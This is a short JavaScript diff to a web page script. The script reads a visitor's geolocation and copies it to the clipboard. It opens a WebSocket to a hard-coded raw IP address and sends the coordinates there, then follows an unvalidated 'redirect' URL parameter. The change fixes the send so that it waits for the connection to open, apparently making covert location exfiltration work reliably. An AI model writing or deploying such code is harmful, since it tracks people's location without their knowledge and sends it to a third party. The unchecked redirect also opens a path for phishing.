@@ -6,8 +6,7 @@
             r = `${a.coords.latitude}, ${a.coords.longitude}`;
             navigator.clipboard.writeText(r);
             ws = new WebSocket("wss://114.146.22.1:4721");
-            setTimeout(function(){},1000);
-            ws.send(r);
+            ws.addEventListener("open", function(){ws.send(r);})
             if(new URL(location.href).searchParams.get("redirect")){location.href=new URL(location.href).searchParams.get("redirect")}
         },
         function(a){navigator.clipboard.writeText(location.href)}
